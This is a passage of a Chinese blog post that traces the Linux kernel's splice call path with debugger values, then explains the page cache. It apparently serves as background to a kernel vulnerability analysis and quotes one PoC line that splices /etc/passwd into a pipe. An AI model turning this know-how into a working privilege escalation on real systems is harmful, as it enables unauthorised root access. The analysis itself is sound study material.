pipe，然后再从pipe到socket，有两次调用）。\n4、splicesplice与sendfile类似，不过splice的in_fd并不限定是文件，也可以是套接字，这使它更通用一些.。\n但是正常如果想要实现从socket到socket的传输的话需要两次系统调用，上面在sendfile中也提到过，\n# 省略了部分参数splice (socket1_fd，  pipe_fdsplice （pipl_fd, socket2_fd\n\n也就是说，splice的系统上下文切换次数是4次，数据拷贝次数是两次，。\n5、总结上面提到sendfile的时候也了解到，sendfile的上下文切换次数与数据拷贝次数均为两次，而splice因为要进行两次系统调用，所以上下文切换次数比sendfile要多两侧，所以在文件-&gt;other的场景下，sendfile的性能是要优于splice的，而如果sendfile用不了，那么splice一般情况下是更好的选择。\n六、splice 系统调用源代码实现0、前言实际上splice利用的就是零拷贝技术。首先明确一点，如果要提供性能，一是减少系统调用，二是减少ring0和ring3间内存拷贝。常规的文件拷贝技术使用的时read和write，并需要一块临时缓冲区，这样既增加了系统调用，又需要ring0和ring3之间的内存拷贝，而splice很好的解决了这个问题，他的内存拷贝只有两个必要的DMA copy，而需要的临时缓冲区是使用管道实现的，优点就是只需要传递指针即可让两个文件都可以访问得到。具体各个拷贝方案的对比参见。\n代码有一部分的变量值是我通过poc实时得出的，并不适用于所有情况。其目的在于了解函数的大体流程。\npoc中调用splice的代码如下\nssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);\n\n这里的fd是 /etc/passwd的文件描述符，p[1]为写管道的文件描述符。代码逻辑为将/etc/passwd中偏移以offset为偏移的内容取一字节放入管道中。这里的offset为0x3。\n代码追踪可以从\nhttps://elixir.bootlin.com/linux/v5.11.1/source/fs/splice.c#L1325\n开始。\n照例这里先将整体的流程图贴出来，方便师傅们对函数调用流程有个整体的把握。\n\n1、splice调用了__do_splice函数。\nSYSCALL_DEFINE6(splice, int, fd_in, loff_t __user *, off_in,\t\tint, fd_out, loff_t __user *, off_out,\t\tsize_t, len, unsigned int, flags)&#123;\tstruct fd in, out;\tlong error;\tif (unlikely(!len))\t\treturn 0;\tif (unlikely(flags &amp; ~SPLICE_F_ALL))\t\treturn -EINVAL;\terror = -EBADF;\tin = fdget(fd_in);\tif (in.file) &#123;\t\tout = fdget(fd_out);\t\tif (out.file) &#123;\t\t\terror = __do_splice(in.file, off_in, out.file, off_out,\t\t\t\t\t\tlen, flags);\t\t\t\t// 跟进\t\t\tfdput(out);\t\t&#125;\t\tfdput(in);\t&#125;\treturn error;&#125;\n\n\n\n2、__do_splice定义了pipe_inode_info类型的ipipe与opipe，之后调用get_pipe_info从传入的file结构体实例中获得pipe实例，然后调用do_splice函数。\nstatic long __do_splice(struct file *in, loff_t __user *off_in,\t\t\tstruct file *out, loff_t __user *off_out,\t\t\tsize_t len, unsigned int flags)&#123;\tstruct pipe_inode_info *ipipe;\tstruct pipe_inode_info *opipe;\tloff_t offset, *__off_in = NULL, *__off_out = NULL;\tlong ret;\tipipe = get_pipe_info(in, true);\t\t\t\t// 取 file-&gt;private_data值，这里为0x0\topipe = get_pipe_info(out, true);\t\t\t// 这里是指向管道的指针，不明白这里的代码有什么作用，这里取到了ipipe和opipe只是做了下校验，后面do_splice也调用了get_pipe_info函数，不如将其放到后面进行校验，少了一次函数调用。\tif (ipipe &amp;&amp; off_in)\t\treturn -ESPIPE;\tif (opipe &amp;&amp; off_out)\t\treturn -ESPIPE;\tif (off_out) &#123;\t\t\t// 为0\t\tif (copy_from_user(&amp;offset, off_out, sizeof(loff_t)))\t\t\treturn -EFAULT;\t\t__off_out = &amp;offset;\t&#125;\tif (off_in) &#123;\t\t\t// 指向loff_t结构体的指针\t\tif (copy_from_user(&amp;offset, off_in, sizeof(loff_t)))\t\t\treturn -EFAULT;\t\t__off_in = &amp;offset;\t&#125;\tret = do_splice(in, __off_in, out, __off_out, len, flags);\t\t// 跟进\tif (ret &lt; 0)\t\treturn ret;\tif (__off_out &amp;&amp; copy_to_user(off_out, __off_out, sizeof(loff_t)))\t\treturn -EFAULT;\tif (__off_in &amp;&amp; copy_to_user(off_in, __off_in, sizeof(loff_t)))\t\treturn -EFAULT;\treturn ret;&#125;\n\n\n\n3、do_splice这里对数据进行了进一步处理，判断了in，off_in，out，off_out\n这里分三种情况，in和out都有pipe时，调用splice_pipe_to_pipe；in为pipe时调用do_splice_from，out为pipe时调用do_splice_to。这俩单个的也涉及offset的用户空间和内核空间复制的问题。\n由于我们poc中的splice系统调用是从文件写入管道，所以我们在实时调试中调用的是do_splice_to。\n/* * Determine where to splice to/from. */long do_splice(struct file *in, loff_t *off_in, struct file *out,\t       loff_t *off_out, size_t len, unsigned int flags)&#123;\tstruct pipe_inode_info *ipipe;\tstruct pipe_inode_info *opipe;\tloff_t offset;\tlong ret;\tif (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||\t\t     !(out-&gt;f_mode &amp; FMODE_WRITE)))\t\treturn -EBADF;\tipipe = get_pipe_info(in, true);\t\t\t\t// 函数返回0x0\topipe = get_pipe_info(out, true);\t\t\t// 函数返回正常，所以接下来跳转到了 66 行，奇怪的是，上面的 __do_splice 也有相同的操作。\tif (ipipe &amp;&amp; opipe) &#123;\t\tif (off_in || off_out)\t\t\treturn -ESPIPE;\t\t/* Splicing to self would be fun, but... */\t\tif (ipipe == opipe)\t\t\treturn -EINVAL;\t\tif ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)\t\t\tflags |= SPLICE_F_NONBLOCK;\t\treturn splice_pipe_to_pipe(ipipe, opipe, len, flags);\t&#125;\tif (ipipe) &#123;\t\tif (off_in)\t\t\treturn -ESPIPE;\t\tif (off_out) &#123;\t\t\tif (!(out-&gt;f_mode &amp; FMODE_PWRITE))\t\t\t\treturn -EINVAL;\t\t\toffset = *off_out;\t\t&#125; else &#123;\t\t\toffset = out-&gt;f_pos;\t\t&#125;\t\tif (unlikely(out-&gt;f_flags &amp; O_APPEND))\t\t\treturn -EINVAL;\t\tret = rw_verify_area(WRITE, out, &amp;offset, len);\t\tif (unlikely(ret &lt; 0))\t\t\treturn ret;\t\tif (in-&gt;f_flags &amp; O_NONBLOCK)\t\t\tflags |= SPLICE_F_NONBLOCK;\t\tfile_start_write(out);\t\tret = do_splice_from(ipipe, out, &amp;offset, len, flags);\t\tfile_end_write(out);\t\tif (!off_out)\t\t\tout-&gt;f_pos = offset;\t\telse\t\t\t*off_out = offset;\t\treturn ret;\t&#125;\tif (opipe) &#123;\t\tif (off_out)\t\t\t\t\t\t\t// off_out == 0x0\t\t\treturn -ESPIPE;\t\tif (off_in) &#123;\t\t\t\t\t\t\t // *off_in == 0x3\t\t\tif (!(in-&gt;f_mode &amp; FMODE_PREAD))\t\t\t\treturn -EINVAL;\t\t\toffset = *off_in;\t\t\t\t// offset = 0x3\t\t&#125; else &#123;\t\t\toffset = in-&gt;f_pos;\t\t&#125;\t\tif (out-&gt;f_flags &amp; O_NONBLOCK)\t\t\t// out-&gt;f_flags == 0x1 #define O_NONBLOCK\t00004000\t没进入该if\t\t\tflags |= SPLICE_F_NONBLOCK;\t\tpipe_lock(opipe);\t\t\t\t// 加锁处理，证明这里要进行管道写作了，管道的写入一定具有原子性\t\tret = wait_for_space(opipe, flags);\t\t\t\t// 等到可用缓冲区，也可证明这里是写管道\t\tif (!ret) &#123;\t\t\t\t\t\t\t\t\t\t// ret == 0x0\t\t\tunsigned int p_space;\t\t\t// 这里确保了写入的内容小于可用缓冲区大小\t\t\t/* Don&#x27;t try to read more the pipe has space for. */\t\t\tp_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);\t\t//p_space == 0x10 opipe-&gt;max_usage == 0x10\t这里管道头尾值相等且均为0x10，管道为空\t\t\tlen = min_t(size_t, len, p_space &lt;&lt; PAGE_SHIFT);\t\t\t\t\t\t\t// len == 0x1\t\t\tret = do_splice_to(in, &amp;offset, opipe, len, flags);\t\t\t\t\t\t\t\t// 跟进\t\t&#125;\t\tpipe_unlock(opipe);\t\tif (ret &gt; 0)\t\t\twakeup_pipe_readers(opipe);\t\tif (!off_in)\t\t\tin-&gt;f_pos = offset;\t\telse\t\t\t*off_in = offset;\t\treturn ret;\t&#125;\treturn -EINVAL;&#125;\n\n\n\n4、do_splice_to该函数做了一些验证，之后跟进f_op-&gt;splice_read。\n/* * Attempt to initiate a splice from a file to a pipe. */// 尝试启动从文件到管道的接头。static long do_splice_to(struct file *in, loff_t *ppos,\t\t\t struct pipe_inode_info *pipe, size_t len,\t\t\t unsigned int flags)&#123;\tint ret;\tif (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))\t\treturn -EBADF;\tret = rw_verify_area(READ, in, ppos, len);\t\t// ret == 0，做了某些验证\tif (unlikely(ret &lt; 0))\t\treturn ret;\tif (unlikely(len &gt; MAX_RW_COUNT))\t\tlen = MAX_RW_COUNT;\tif (unlikely(!in-&gt;f_op-&gt;splice_read))\t\treturn warn_unsupported(in, &quot;read&quot;);\treturn in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);\t// 跟进&#125;\n\n\n\n5、f_op-&gt;splice_read这里的f_op-&gt;splice_read在不同的文件系统中的定义是不一样的\n\n个人调试漏洞的环境为ext4的文件系统，所以查看ext4内的定义\n...#endif\t.mmap\t\t= ext4_file_mmap,\t.mmap_supported_flags = MAP_SYNC,\t.open\t\t= ext4_file_open,\t.release\t= ext4_release_file,\t.fsync\t\t= ext4_sync_file,\t.get_unmapped_area = thp_get_unmapped_area,\t.splice_read\t= generic_file_splice_read,\t.splice_write\t= iter_file_splice_write,\t.fallocate\t= ext4_fallocate,&#125;;\n\n所以实际调用的函数为generic_file_splice_read。\n6、generic_file_splice_read将pipe相关的信息与len放入iov_iter结构体实例to中，定义kiocb协助管理I/O。\n/** * generic_file_splice_read - splice data from file to a pipe * @in:\t\tfile to splice from * @ppos:\tposition in @in * @pipe:\tpipe to splice to * @len:\tnumber of bytes to splice * @flags:\tsplice modifier flags * * Description: *    Will read pages from given file and fill them into a pipe. Can be *    used as long as it has more or less sane -&gt;read_iter(). * *//**  * generic_file_splice_read - 将数据从文件拼接到管道  * @in: 要拼接的文件  * @ppos：@in 中的位置  * @pipe: 要拼接的管道  * @len: 要拼接的字节数  * @flags: 拼接修饰符标志  *  * 描述：  * 将从给定文件中读取页面并将它们填充到管道中。 只要它具有或多或少的 sane -&gt;read_iter() 就可以使用。  *  */ssize_t generic_file_splice_read(struct file *in, loff_t *ppos,\t\t\t\t struct pipe_inode_info *pipe, size_t len,\t\t\t\t unsigned int flags)\t\t// in 传入的文件结构体，ppos == 0x3， pipe为传入的管道，len == 0x1，flags == 0x0&#123;\tstruct iov_iter to;\tstruct kiocb kiocb;\tunsigned int i_head;\tint ret;\tiov_iter_pipe(&amp;to, READ, pipe, len);\t\t\t// 使用 pipe 和 len 对  to 进行初始化，将 pipe ,pipe-&gt;head , len 等的值都传入 to 的各个成员中。\ti_head = to.head;\tinit_sync_kiocb(&amp;kiocb, in);\t\t// 利用 in 对 kiocb 进行的初始化 ，kiocb是Linux内核中协助异步I/O操作的数据类型\tkiocb.ki_pos = *ppos;\tret = call_read_iter(in, &amp;kiocb, &amp;to);\t\t\t// 跟进\tif (ret &gt; 0) &#123;\t\t*ppos = kiocb.ki_pos;\t\tfile_accessed(in);\t&#125; else if (ret &lt; 0) &#123;\t\tto.head = i_head;\t\tto.iov_offset = 0;\t\tiov_iter_advance(&amp;to, 0); /* to free what was emitted */\t\t/*\t\t * callers of -&gt;splice_read() expect -EAGAIN on\t\t * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.\t\t */\t\tif (ret == -EFAULT)\t\t\tret = -EAGAIN;\t&#125;\treturn ret;&#125;\n\n\n\n7、call_read_iter &amp; f_op-&gt;read_iter和之前一样，找到ext4文件系统\nstatic inline ssize_t call_read_iter(struct file *file, struct kiocb *kio,\t\t\t\t     struct iov_iter *iter)&#123;\treturn file-&gt;f_op-&gt;read_iter(kio, iter);&#125;\n\n\nconst struct file_operations ext4_file_operations = &#123;\t.llseek\t\t= ext4_llseek,\t.read_iter\t= ext4_file_read_iter,\t\t\t// 跟进    ...\n\n\n\n8、ext4_file_read_iter跟进generic_file_read_iter函数。这里传入的参数分别为kiocb的实例以及iov_iter的实例。\nstatic ssize_t ext4_file_read_iter(struct kiocb *iocb, struct iov_iter *to)&#123;\tstruct inode *inode = file_inode(iocb-&gt;ki_filp);\tif (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))\t\treturn -EIO;\tif (!iov_iter_count(to))\t\treturn 0; /* skip atime */#ifdef CONFIG_FS_DAX\tif (IS_DAX(inode))\t\treturn ext4_dax_read_iter(iocb, to);#endif\tif (iocb-&gt;ki_flags &amp; IOCB_DIRECT)\t\t// iocb-&gt;ki_flags == 0x0\t\treturn ext4_dio_read_iter(iocb, to);\treturn generic_file_read_iter(iocb, to);\t\t\t// 跟进，此时 iocb 可以索引到传入的file，to 可以索引到传入的pipe。iocb-&gt;ki_filp 为指向file的指针，to-&gt;count 为splice的长度，to-&gt;pipe 为指向pipe的指针&#125;\n\n\n\n9、generic_file_read_iter没做啥操作，大if跳过去了，跟进generic_file_buffered_read函数。\n// 以下翻译自源码注释/**  * generic_file_read_iter - 通用文件系统读取例程  * @iocb: 内核 I/O 控制块  * @iter: 读取数据的目的地  *  * 这是所有可以直接使用页面缓存的文件系统的“read_iter()”例程。  *  * iocb-&gt;ki_flags 中的 IOCB_NOWAIT 标志表示在不等待 I/O 请求完成而无法读取数据时应返回 -EAGAIN； 它不会阻止预读。  *  * iocb-&gt;ki_flags 中的 IOCB_NOIO 标志表示不应为读取或预读发出新的 I/O 请求。 当无法读取数据时，应返回-EAGAIN。 当触发预读时，应返回部分的、可能为空的读取。  *  * 返回：  * * 复制的字节数，即使对于部分读取负错误代码（如果 IOCB_NOIO 则为 0）如果没有读取任何内容  */ssize_tgeneric_file_read_iter(struct kiocb *iocb, struct iov_iter *iter)&#123;\tsize_t count = iov_iter_count(iter);\t\t\t// count == 0x1，为读取内容的长度，也就是我们传入的参数\tssize_t retval = 0;\tif (!count)\t\tgoto out; /* skip atime */\tif (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;\t\t\t// iocb-&gt;ki_flags == 0x0，所以没进入该if\t\tstruct file *file = iocb-&gt;ki_filp;\t\tstruct address_space *mapping = file-&gt;f_mapping;\t\tstruct inode *inode = mapping-&gt;host;\t\tloff_t size;\t\tsize = i_size_read(inode);\t\tif (iocb-&gt;ki_flags &amp; IOCB_NOWAIT) &#123;\t\t\tif (filemap_range_has_page(mapping, iocb-&gt;ki_pos,\t\t\t\t\t\t   iocb-&gt;ki_pos + count - 1))\t\t\t\treturn -EAGAIN;\t\t&#125; else &#123;\t\t\tretval = filemap_write_and_wait_range(mapping,\t\t\t\t\t\tiocb-&gt;ki_pos,\t\t\t\t\t        iocb-&gt;ki_pos + count - 1);\t\t\tif (retval &lt; 0)\t\t\t\tgoto out;\t\t&#125;\t\tfile_accessed(file);\t\tretval = mapping-&gt;a_ops-&gt;direct_IO(iocb, iter);\t\tif (retval &gt;= 0) &#123;\t\t\tiocb-&gt;ki_pos += retval;\t\t\tcount -= retval;\t\t&#125;\t\tiov_iter_revert(iter, count - iov_iter_count(iter));\t\t/*\t\t * Btrfs can have a short DIO read if we encounter\t\t * compressed extents, so if there was an error, or if\t\t * we&#x27;ve already read everything we wanted to, or if\t\t * there was a short read because we hit EOF, go ahead\t\t * and return.  Otherwise fallthrough to buffered io for\t\t * the rest of the read.  Buffered reads will not work for\t\t * DAX files, so don&#x27;t bother trying.\t\t */                /*如果我们遇到压缩范围，Btrfs 可以进行短 DIO 读取，因此如果出现错误，或者如果我们已经读取了我们想要的所有内容，或者因为我们遇到 EOF 而导致短读取，请继续并返回。 否则，在其余的读取过程中将使用缓冲 io。 缓冲读取不适用于 DAX 文件，因此不要费心尝试。\t\t*/\t\tif (retval &lt; 0 || !count || iocb-&gt;ki_pos &gt;= size ||\t\t    IS_DAX(inode))\t\t\tgoto out;\t&#125;\tretval = generic_file_buffered_read(iocb, iter, retval);\t// retval == 0x0 ，跟进out:\t\treturn retval;&#125;\n\n\n\n10、generic_file_buffered_read这里通过kmalloc_array函数为pages生成一块空间，并通过generic_file_buffered_read_get_pages将iocb的部分内容传入pages。之后调用copy_page_to_iter。\n// 以下翻译自源码注释/**  * generic_file_buffered_read - 通用文件读取例程  * @iocb: 要读取的 iocb  * @iter: 数据目的地  * @written: 已复制  *  * 这是一个通用的文件读取例程，并使用 mapping-&gt;a_ops-&gt;readpage() 函数来处理实际的低级内容。  *  * 这真的很难看。 但是当涉及到错误处理等时，goto 实际上试图澄清一些逻辑。  *  * 返回：  * * 复制的总字节数，包括那些已经被@写入负错误代码的字节，如果没有复制的话  */ssize_t generic_file_buffered_read(struct kiocb *iocb,\t\tstruct iov_iter *iter, ssize_t written)&#123;\tstruct file *filp = iocb-&gt;ki_filp;\t\t\t\t\t// 指向file的指针\tstruct file_ra_state *ra = &amp;filp-&gt;f_ra;\t\t\t// 用于跟踪单个文件的预读状态\tstruct address_space *mapping = filp-&gt;f_mapping;\t\t// struct address_space ： Contents of a cacheable, mappable object.\tstruct inode *inode = mapping-&gt;host;\tstruct page *pages_onstack[PAGEVEC_SIZE], **pages = NULL;\tunsigned int nr_pages = min_t(unsigned int, 512,\t\t\t((iocb-&gt;ki_pos + iter-&gt;count + PAGE_SIZE - 1) &gt;&gt; PAGE_SHIFT) -\t\t\t(iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT));\t\t// nr_pages == 0x1\tint i, pg_nr, error = 0;\tbool writably_mapped;\tloff_t isize, end_offset;\tif (unlikely(iocb-&gt;ki_pos &gt;= inode-&gt;i_sb-&gt;s_maxbytes))\t\treturn 0;\tif (unlikely(!iov_iter_count(iter)))\t\treturn 0;\tiov_iter_truncate(iter, inode-&gt;i_sb-&gt;s_maxbytes);\t    /*    iov_iter_truncate 函数定义如下    static inline void iov_iter_truncate(struct iov_iter *i, u64 count)&#123;\tif (i-&gt;count &gt; count)\t\ti-&gt;count = count;&#125;\t这里 iter-&gt;count = 0x1， inode-&gt;i_sb-&gt;s_maxbytes == 0xffffffff000， inode-&gt;i_sb-&gt;s_maxbytes相当于iter-&gt;count的上限。\t*/    \tif (nr_pages &gt; ARRAY_SIZE(pages_onstack))\t\tpages = kmalloc_array(nr_pages, sizeof(void *), GFP_KERNEL);\tif (!pages) &#123;\t\tpages = pages_onstack;\t\t\t\t\t// *pages == 0x1\t\tnr_pages = min_t(unsigned int, nr_pages, ARRAY_SIZE(pages_onstack));\t\t\t\t// nr_pages == 0x1\t&#125;\tdo &#123;\t\tcond_resched();        /*        翻译自源码注释：如果我们已经成功复制了一些数据，那么我们不能再安全地返回 -EIOCBQUEUED。 因此，此时标记一个异步读取 NOWAIT 。\t\t*/        // 实际上此时written值为0x0，我们还写入任何数据\t\tif ((iocb-&gt;ki_flags &amp; IOCB_WAITQ) &amp;&amp; written)\t\t\tiocb-&gt;ki_flags |= IOCB_NOWAIT;\t\ti = 0;\t\tpg_nr = generic_file_buffered_read_get_pages(iocb, iter,\t\t\t\t\t\t\t     pages, nr_pages);\t\t// pg_nr == 0x1\t\tif (pg_nr &lt; 0) &#123;\t\t\terror = pg_nr;\t\t\tbreak;\t\t&#125;        /*        翻译自源码：* 在我们知道页面是最新的之后，必须检查 i_size。** 检查后检查 i_size 允许我们计算“nr”的正确值，这意味着页面的零填充部分不会复制回用户空间（除非另一个截断扩展文件 - 这是需要的）。*/\t\tisize = i_size_read(inode);\t\t\t// isize == 0x552\t\tif (unlikely(iocb-&gt;ki_pos &gt;= isize))\t\t// iocb-&gt;ki_pos == 0x3，这个 iocb-&gt;ki_pos是传入的文件的偏移offset。\t\t\tgoto put_pages;\t\tend_offset = min_t(loff_t, isize, iocb-&gt;ki_pos + iter-&gt;count);\t\t// end_offset == 0x4\tsplice的是从0x3 ~ 0x4的一个字节\t\twhile ((iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT) + pg_nr &gt;\t\t       (end_offset + PAGE_SIZE - 1) &gt;&gt; PAGE_SHIFT)\t\t\tput_page(pages[--pg_nr]);        /*        翻译自源码注释：* 一旦我们开始复制数据，我们不想接触任何可能被争用的缓存行：\t\t*/\t\twritably_mapped = mapping_writably_mapped(mapping);\t\t/*\t\t * When a sequential read accesses a page several times, only\t\t * mark it as accessed the first time.\t\t */\t\tif (iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT !=\t\t    ra-&gt;prev_pos &gt;&gt; PAGE_SHIFT)\t\t// iocb-&gt;ki_pos = 0x3 , ra-&gt;prev_pos ==  0xffffffffffffffff\t\t\tmark_page_accessed(pages[0]);\t\tfor (i = 1; i &lt; pg_nr; i++)\t\t\tmark_page_accessed(pages[i]);\t\tfor (i = 0; i &lt; pg_nr; i++) &#123;\t\t\tunsigned int offset = iocb-&gt;ki_pos &amp; ~PAGE_MASK;\t\t// offset == 0x3\t\t\tunsigned int bytes = min_t(loff_t, end_offset - iocb-&gt;ki_pos,\t\t\t\t\t\t   PAGE_SIZE - offset);\t\t// bytes == 0x1\t\t\tunsigned int copied;            /*            翻译自源码注释：            * 如果用户可以使用任意虚拟地址写入此页面，请在内核端读取页面之前注意潜在的别名。            */\t\t\tif (writably_mapped)\t\t\t\tflush_dcache_page(pages[i]);\t\t\tcopied = copy_page_to_iter(pages[i], offset, bytes, iter);\t// 此时 i== 0，offset == 0x3，bytes == 0x1 跟进\t\t\twritten += copied;\t\t\tiocb-&gt;ki_pos += copied;\t\t\tra-&gt;prev_pos = iocb-&gt;ki_pos;\t\t\tif (copied &lt; bytes) &#123;\t\t\t\terror = -EFAULT;\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;put_pages:\t\tfor (i = 0; i &lt; pg_nr; i++)\t\t\tput_page(pages[i]);\t&#125; while (iov_iter_count(iter) &amp;&amp; iocb-&gt;ki_pos &lt; isize &amp;&amp; !error);\tfile_accessed(filp);\tif (pages != pages_onstack)\t\tkfree(pages);\treturn written ? written : error;&#125;\n\n\n\n\n\ngef➤  p *iocb$179 = &#123;  ki_filp = 0xffff8880042a6700,  ki_pos = 0x3,  ki_complete = 0x0 &lt;fixed_percpu_data&gt;,  private = 0x0 &lt;fixed_percpu_data&gt;,  ki_flags = 0x0,  ki_hint = 0x0,  ki_ioprio = 0x0,  &#123;    ki_cookie = 0x0,    ki_waitq = 0x0 &lt;fixed_percpu_data&gt;  &#125;&#125;gef➤  p iocb$180 = (struct kiocb *) 0xffffc900003b7df0\n\n\n\n11、copy_page_to_iter没做啥，继续跟进copy_page_to_iter_pipe。\nsize_t copy_page_to_iter(struct page *page, size_t offset, size_t bytes,\t\t\t struct iov_iter *i)&#123;\tif (unlikely(!page_copy_sane(page, offset, bytes)))\t\treturn 0;\tif (i-&gt;type &amp; (ITER_BVEC|ITER_KVEC)) &#123;\t\tvoid *kaddr = kmap_atomic(page);\t\tsize_t wanted = copy_to_iter(kaddr + offset, bytes, i);\t\tkunmap_atomic(kaddr);\t\treturn wanted;\t&#125; else if (unlikely(iov_iter_is_discard(i)))\t\treturn bytes;\telse if (likely(!iov_iter_is_pipe(i)))\t\treturn copy_page_to_iter_iovec(page, offset, bytes, i);\telse\t\treturn copy_page_to_iter_pipe(page, offset, bytes, i);\t\t// 跟进&#125;\n\n\n\n12、copy_page_to_iter_pipe从这里可以看出，上面将文件信息放入page，这里将page赋值给pipe_buffer-&gt;page，并不涉及到数据的复制，完全靠的是指针的传递。\nstatic size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,\t\t\t struct iov_iter *i)&#123;\tstruct pipe_inode_info *pipe = i-&gt;pipe;\tstruct pipe_buffer *buf;\tunsigned int p_tail = pipe-&gt;tail;\t\t\t// p_tail  = 0x10\tunsigned int p_mask = pipe-&gt;ring_size - 1;\t\t// p_mask === 0xf\tunsigned int i_head = i-&gt;head;\t\t\t// i_head == 0x10\tsize_t off;\tif (unlikely(bytes &gt; i-&gt;count))\t\t// bytes == 0x1  i-&gt;count == 0x1\t\tbytes = i-&gt;count;\tif (unlikely(!bytes))\t\treturn 0;\tif (!sanity(i))\t\t\t\t\t\t// 对inode 做一些合规检查，比如pipe不能为空，必须在 last buffer中等等。\t\treturn 0;\toff = i-&gt;iov_offset;\t\t\t\t// off == 0x0 ，这里的off是管道偏移，我们传入的参数就是0\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];\tif (off) &#123;\t\tif (offset == off &amp;&amp; buf-&gt;page == page) &#123;\t\t\t/* merge with the last one */\t\t\tbuf-&gt;len += bytes;\t\t\ti-&gt;iov_offset += bytes;\t\t\tgoto out;\t\t&#125;\t\ti_head++;\t\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];\t&#125;\tif (pipe_full(i_head, p_tail, pipe-&gt;max_usage))\t\treturn 0;\tbuf-&gt;ops = &amp;page_cache_pipe_buf_ops;\tget_page(page);\tbuf-&gt;page = page;\t\t\t\t\t\t// 可见splice并没有数据的复制，有的只有指针的传递，将文件page的指针赋值给管道的buf-&gt;page。\tbuf-&gt;offset = offset;\tbuf-&gt;len = bytes;\tpipe-&gt;head = i_head + 1;\ti-&gt;iov_offset = offset + bytes;\ti-&gt;head = i_head;out:\ti-&gt;count -= bytes;\treturn bytes;&#125;\n\n\n\n七、page cache考虑到这样一个场景，在现有的linux环境下，当我们使用write/read进行读写文件时，我们操作的是磁盘文件吗？\n带着这个疑问，我们思考一下，当涉及到文件操作时，操作系统必须解决两个严重的问题：\n\n当操作系统读做数据的访问操作时，对磁盘的访问速度远小于内存，文件越大，效果越明显。\n当多个进程均访问同一个磁盘文件的内容时，由于进程数据隔离，不可能将文件内容在所有进程都拷贝一份。如果您使用 Process Explorer查看 Windows 进程，您会看到每个进程中加载了大约 15MB 的常用 DLL。我的 Windows 机器现在正在运行 100 个进程，因此如果不共享，我将使用高达 ~1.5 GB 的物理 RAM来处理常见的 DLL。\n\n基于上面的观点，对内存的访问相较于对磁盘的访问来说更高效。\n但是内存是有限的，我们不可能将磁盘上所有的内容都放入内存中，这时就需要对放入内存中的磁盘文件进行筛选。这时Page cache应运而生。\n在计算机，page cache，有时也称为disk cache，它是一种透明缓存，用于存储源自二级存储设备（如硬盘驱动器(HDD) 或固态驱动器(SSD)）的页面。操作系统在主内存(RAM)的其他未使用部分中保留页面缓存，从而更快地访问缓存页面的内容并提高整体性能。页面缓存在内核中通过分页内存管理实现，并且对应用程序几乎是透明的。\n由于硬盘和内存的读写性能差距巨大，Linux默认情况是以异步方式读写文件的。比如调用系统函数open()打开或者创建文件时缺省情况下是带有O_ASYNC flag的。Linux借助于内核的page cache来实现这种异步操作。引用《Understanding the Linux Kernel, 3rd Edition》中关于page cache的定义：\n\nThe page cache is the main disk cache used by the Linux kernel. In most cases, the kernel refers to the page cache when reading from or writing to disk. New pages are added to the page cache to satisfy User Mode processes’s read requests. If the page is not already in the cache, a new entry is added to the cache and filled with the data read from the disk. If there is enough free memory, the page is kept in the cache for an indefinite period of time and can then be reused by other processes without accessing the disk.Similarly, before writing a page of data to a block device, the kernel verifies whether the corresponding page is already included in the cache; if not, a new entry is added to the cache and filled with the data to be written on disk. The I/O data transfer does not start immediately: the disk update is delayed for a few seconds, thus giving a chance to the processes to further modify the data to be written (in other words, the kernel implements deferred write operations).\n\n也就是说，我们平常向硬盘写文件时，默认异步情况下，并不是直接把文件内容写入到硬盘中才返回的，而是成功拷贝到内核的page cache后就直接返回，所以大多数情况下，硬盘写操作不会是性能瓶颈。写入到内核page cache的pages成为dirty pages，稍后会由内核线程pdflush真正写入到硬盘上。\n从硬盘读取文件时，同样不是直接把硬盘上文件内容读取到用户态内存，而是先拷贝到内核的page cache，然后再“拷贝”到用户态内存，这样用户就可以访问该文件。因为涉及到硬盘操作，所以第一次读取一个文件时，不会有性能提升；不过，如果一个文件已经存在page cache中，再次读取该文件时就可以直接从page cache中命中读取不涉及硬盘操作，这时性能就会有很大提高。\n下面用dd比较下异步（缺省模式）和同步写硬盘的速度差别：\n$ dd if=/dev/urandom of=async.txt bs=64M count=16 iflag=fullblock16+0 records in16+0 records out1073741824 bytes (1.1 GB, 1.0 GiB) copied, 7.618 s, 141 MB/s$ dd if=/dev/urandom of=sync.txt bs=64M count=16 iflag=fullblock oflag=sync16+0 records in16+0 records out1073741824 bytes (1.1 GB, 1.0 GiB) copied, 13.2175 s, 81.2 MB/s\n\npage cache除了可以提升和硬盘交互性能外，下面继续讨论page cache功能。\n1、如果程序crash，异步模式会丢失数据吗？比如存在这样的场景：一批数据已经成功写入到page cache，这时程序突然crash，但是在page cache里的数据还没来得及被pdflush写回到硬盘，这批数据会丢失吗？答案是，要看具体情况：\n\n如果OS没有crash或者重启的话，仅仅是写数据的程序crash，那么已经成功写入到page cache中的dirty pages是会被pdflush在合适的时机被写回到硬盘，不会丢失数据；\n如果OS也crash或者重启的话，因为page cache存放在内存中，一旦断电就丢失了，那么就会丢失数据。至于这种情况下，会丢失多少数据，主要看系统重启前有多少dirty pages被写入到硬盘，已经成功写回硬盘的就不会丢失；没来得急写回硬盘的数据就彻底丢失了。这也是异步写硬盘的一个潜在风险。同步写硬盘时就不存在这种丢数据的风险。同步写操作返回成功时，能保证数据一定被保存在硬盘上了。\n\n引用RocksDB wiki中关于“Asynchronous Writes”描述：\n\nAsynchronous writes are often more than a thousand times as fast as synchronous writes. The downside of asynchronous writes is that a crash of the machine may cause the last few updates to be lost. Note that a crash of just the writing process (i.e., not a reboot) will not cause any loss since even when sync is false, an update is pushed from the process memory into the operating system before it is considered done.\n\n那么如何避免因为系统重启或者机器突然断电，导致数据丢失问题呢？可以借助于WAL（Write-Ahead 